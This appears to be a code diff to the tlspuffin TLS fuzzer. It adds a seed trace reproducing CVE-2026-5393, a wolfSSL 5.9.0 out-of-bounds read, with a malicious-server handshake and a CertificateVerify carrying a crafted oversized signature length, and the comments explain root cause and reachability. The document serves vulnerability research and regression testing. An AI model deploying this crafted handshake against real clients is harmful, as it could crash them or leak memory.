@@ -42,6 +42,9 @@ pub fn create_corpus(
 
         // Downgrade attack: the client offers both TLS 1.2 and TLS 1.3 (`TLSVersion::Both`).
         seed_cve_2024_5814: put.supports("tls12") && put.supports("tls13"),
+
+        // Malicious server: CKS extension, X9.146 dual-algorithm certificate (needs PUT support).
+        seed_cve_2026_5393: put.supports("tls13") && put.supports("dual_alg_certs_support"),
     )
 }
 
@@ -1545,6 +1548,184 @@ pub fn seed_cve_2024_5814(client: AgentName) -> Trace<TLSProtocolTypes> {
     }
 }
 
+
+/// <https://nvd.nist.gov/vuln/detail/CVE-2026-5393>
+///
+/// Out-of-bounds read in `DoTls13CertificateVerify` of wolfSSL 5.9.0 built with
+/// `--enable-experimental --enable-dual-alg-certs` (X9.146 dual-algorithm certificates), fixed in
+/// 5.9.1 by commit 3bc72b5d27780f668ee34b1b38ac053665d49c6e
+/// (in <https://github.com/wolfSSL/wolfssl/pull/10079>).
+///
+/// Root cause (CWE-125): when the CKS extension selected "both" signatures, the signature field of
+/// a CertificateVerify holds two length-prefixed signatures. wolfSSL reads the first length at the
+/// start of the field and the second one right after the first signature, without checking either
+/// position against the signature field length. A crafted first length makes the second 2-byte
+/// read land up to ~64 KiB past the message.
+///
+/// Versions: the CVE lists all versions < 5.9.1, but before 5.9.0 the vulnerable code is
+/// unreachable: every CertificateVerify first had to use a signature algorithm from the receiver's
+/// own list, which never contains the hybrid codes required for "both". 5.9.0 skips that check
+/// for "both".
+///
+/// Reachability (malicious server, default client except for the build flags and a classical
+/// group list, see the descriptor below):
+/// - the client adopts an unsolicited CKS extension from EncryptedExtensions when it has no CKS
+///   preference of its own ([`fn_cks_both_server_extension`]);
+/// - the server certificate must carry an alternative public key of the type named by the hybrid
+///   scheme: [`fn_alice_dual_alg_cert`] is issued by the trusted `alice.pem` and carries an
+///   ML-DSA-44 key, which the client decodes before the vulnerable read;
+/// - the CertificateVerify uses the hybrid scheme RSA-PSS + ML-DSA-44 (0xFEA2) and a signature
+///   field starting with a large first length. Its signatures are never checked: the
+///   out-of-bounds read happens first.
+pub fn seed_cve_2026_5393(client: AgentName) -> Trace<TLSProtocolTypes> {
+    let curve = term! {
+        fn_get_any_client_curve(
+            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))])
+        )
+    };
+
+    let server_hello = term! {
+          fn_server_hello(
+            fn_protocol_version12,
+            fn_new_random,
+            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))]),
+            fn_cipher_suite13_aes_128_gcm_sha256,
+            fn_compression,
+            (fn_server_extensions_make(
+              (fn_server_extensions_append(
+                  (fn_server_extensions_append(
+                      fn_server_extensions_new,
+                      (fn_key_share_server_extension(
+                          (fn_key_share_deterministic((@curve)))
+                      ))
+                  )),
+                  fn_supported_versions13_server_extension
+            ))))
+        )
+    };
+
+    let server_hello_transcript = term! {
+        fn_append_transcript(
+            (fn_append_transcript(
+                fn_new_transcript,
+                ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))]) // ClientHello
+            )),
+            (@server_hello) // plaintext ServerHello
+        )
+    };
+
+    // CKS "both": the client adopts it although it did not send a CKS extension
+    let encrypted_extensions = term! {
+        fn_encrypted_extensions(
+            (fn_server_extensions_append(
+                fn_server_extensions_new,
+                fn_cks_both_server_extension
+            ))
+        )
+    };
+
+    let certificate = term! {
+        fn_certificate13(
+            (fn_payload_u8((fn_empty_bytes_vec))),
+            (fn_certificate_entries_make(
+                (fn_chain_append_certificate_entry(
+                  fn_empty_certificate_chain,
+                  (fn_certificate_entry_extensions(
+                    fn_alice_dual_alg_cert,
+                    (fn_cert_extensions_make(
+                        fn_cert_extensions_new
+                    ))
+            ))))
+            ))
+        )
+    };
+
+    // The signature field only holds a large first length: the second length is read past the end
+    // of the WOLFSSL object holding the input buffer (see fn_large_u16_length_bytes).
+    let certificate_verify = term! {
+        fn_certificate_verify(
+            fn_sig_scheme_hybrid_rsa_pss_mldsa44,
+            (fn_payload_u16(fn_large_u16_length_bytes))
+        )
+    };
+
+    Trace {
+        prior_traces: vec![],
+        descriptors: vec![AgentDescriptor::from_config(
+            client,
+            TLSDescriptorConfig {
+                tls_version: TLSVersion::V1_3,
+                typ: AgentType::Client,
+                // Unrelated to the bug: wolfSSL >= 5.9.1 enables ML-KEM by default and sends its
+                // first key share for X25519MLKEM768, which tlspuffin cannot compute. Restricting
+                // the groups keeps the trace identical on the vulnerable 5.9.0 and the fixed 5.9.1.
+                groups: Some(String::from("P-256:P-384")),
+                ..TLSDescriptorConfig::default()
+            },
+        )],
+        steps: vec![
+            OutputAction::new_step(client),
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { server_hello
+                }),
+            },
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! {
+                        fn_encrypt_handshake(
+                            (@encrypted_extensions),
+                            (@server_hello_transcript),
+                            (fn_get_client_key_share(((client, 0)), (@curve))),
+                            fn_no_psk,
+                            (@curve),
+                            fn_false,
+                            fn_seq_0,  // sequence 0
+                            fn_new_random,
+                            fn_cipher_suite13_aes_128_gcm_sha256
+                        )
+                    }
+                }),
+            },
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! {
+                        fn_encrypt_handshake(
+                            (@certificate),
+                            (@server_hello_transcript),
+                            (fn_get_client_key_share(((client, 0)), (@curve))),
+                            fn_no_psk,
+                            (@curve),
+                            fn_false,
+                            fn_seq_1,  // sequence 1
+                            fn_new_random,
+                            fn_cipher_suite13_aes_128_gcm_sha256
+                        )
+                    }
+                }),
+            },
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! {
+                        fn_encrypt_handshake(
+                            (@certificate_verify),
+                            (@server_hello_transcript),
+                            (fn_get_client_key_share(((client, 0)), (@curve))),
+                            fn_no_psk,
+                            (@curve),
+                            fn_false,
+                            fn_seq_2,  // sequence 2
+                            fn_new_random,
+                            fn_cipher_suite13_aes_128_gcm_sha256
+                        )
+                    }
+                }),
+            },
+        ],
+        ..Default::default()
+    }
+}
+
 #[cfg(test)]
 pub mod tests {
     use puffin::algebra::TermType;
@@ -1566,6 +1747,7 @@ pub mod tests {
             seed_freak.build_named_trace(),
             seed_cve_2022_25640_simple.build_named_trace(),
             seed_cve_2022_38153.build_named_trace(),
+            seed_cve_2026_5393.build_named_trace(),
             // TODO: 685 seed_cve_2022_39173.build_named_trace(),
             // TODO: 1695 seed_cve_2022_39173_full.build_named_trace(),
             // TODO: 322 seed_cve_2022_39173_minimized.build_named_trace(),
